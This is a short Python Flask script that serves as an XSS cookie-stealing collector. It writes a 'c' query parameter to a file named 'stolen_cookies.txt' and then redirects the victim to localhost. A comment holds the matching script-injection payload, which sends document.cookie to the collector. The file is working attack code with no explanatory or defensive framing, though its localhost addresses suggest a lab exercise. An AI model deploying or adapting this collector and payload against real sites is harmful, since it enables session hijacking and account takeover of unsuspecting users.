from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    cookie = request.args.get('c')
    with open('stolen_cookies.txt', "a") as file:
        file.write(f"{datetime.now()}: {cookie}\n")

    return redirect("http://localhost:5000")

#<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>

if __name__ == '__main__':
    app.run(port=1000)